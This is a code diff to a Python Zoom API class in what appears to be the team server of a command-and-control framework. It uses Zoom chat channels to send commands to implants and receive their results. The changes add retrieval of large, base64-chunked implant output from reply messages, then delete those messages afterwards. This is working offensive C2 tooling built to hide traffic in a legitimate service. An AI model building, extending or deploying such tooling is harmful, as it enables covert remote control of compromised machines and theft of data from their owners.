@@ -1,5 +1,4 @@
-import binascii
-
+from time import sleep
 import requests
 import json
 import base64
@@ -17,7 +16,8 @@ class ZoomAPI:
         self.GenerateTokenUrl = "https://zoom.us/oauth/token"
         self.UpdateMessageUrl = "https://api.zoom.us/v2/chat/users/me/messages/MESSAGE_ID"
         self.CreateChannelUrl = "https://api.zoom.us/v2/chat/users/me/channels"
-        self.RecvMessageUrl = "https://api.zoom.us/v2/chat/users/me/messages?to_channel=CHANNEL"
+        self.RecvMessageUrl = "https://api.zoom.us/v2/chat/users/me/messages?to_channel=CHANNEL&page_size=50&exclude_child_message=true"
+        self.RecvChildMessageUrl = "https://api.zoom.us/v2/chat/users/me/messages?to_channel=CHANNEL&page_size=50"
         with open("TeamServer/TeamServerConfig.json", "r") as ConfigFile:
             Configuration = json.load(ConfigFile)
             ConfigFile.close()
@@ -26,7 +26,7 @@ class ZoomAPI:
         self.ClientSecret = Configuration['Client_Secret']
         self.Email = Configuration['Email']
 
-        self.AccessToken = self.GenerateToken()
+        # self.AccessToken = self.GenerateToken()
 
     def GenerateToken(self):
         RequiredPermissions = [
@@ -132,7 +132,7 @@ class ZoomAPI:
                 message = [message['message'] for message in jResponse['messages']]
                 MainMessage = message[0]
                 ChannelName = DB.QueryChannelByID(ChannelID)
-                if MainMessage == "Implant Checked In!" or MainMessage == " Command Executed.":
+                if MainMessage == "Implant Checked In!" or MainMessage == " Command Executed." or MainMessage == "Huge Output Send!":
                     return message_ids[0], MainMessage
                 elif MainMessage[:8] == "Result: ":
                     output = MainMessage[8:]
@@ -149,9 +149,45 @@ class ZoomAPI:
                     return message_ids[0], MainMessage
                 elif MainMessage[:9] == "command: " and MainMessage[:13] != "command: exit":
                     return message_ids[0], "Command already In Queue"
+                elif MainMessage == "Huge Output":
+                    sleep(10)
+                    self.GetChildMessage(AccessToken, ChannelID, message_ids[0])
+                    self.UpdateMessage(AccessToken, ChannelID, message_ids[1], "Command Executed.", IsACommand="")
+                    self.DeleteMessage(AccessToken, message_ids[0], ChannelID)
+                    return message_ids[1], "Huge Output"
                 else:
                     return f"Implant is Not Yet checked In!\nLatest Message: {MainMessage}", None
             except KeyError:
                 return f"Implant is Not Yet checked In!\nError: {jResponse}", None
         except IndexError:
             return f"Implant is Not Yet checked In!\nError: {jResponse}", None
+
+    def GetChildMessage(self, AccessToken, ChannelID, messageID):
+        url = self.RecvChildMessageUrl.replace('CHANNEL', ChannelID)
+        headers = {
+            'Authorization': f'Bearer {AccessToken}',
+            'Content-Type': 'application/json'
+        }
+        response = requests.get(url, headers=headers)
+        jResponse = response.json()
+
+        b64_data = ""
+        for message in jResponse['messages'][::-1]:
+            if 'reply_main_message_id' in message and message['reply_main_message_id'] == messageID:
+                i = message.get('message', '')
+                i = i.replace("result: ", "")
+                b64_data = b64_data + i
+
+        print(colored(base64.b64decode(b64_data.encode()).decode(), "blue"))
+
+    def DeleteMessage(self, AccessToken, messageID, ChannelID):
+        url = self.UpdateMessageUrl.replace("MESSAGE_ID", messageID) + f"?to_channel={ChannelID}"
+        headers = {
+            'Authorization': f'Bearer {AccessToken}',
+            'Content-Type': 'application/json'
+        }
+        jResponse = requests.delete(url, headers=headers)
+        if len(jResponse.text) == 0:
+            pass
+        else:
+            print(colored(f"Error Deleting Message {jResponse.text}", 'red'))
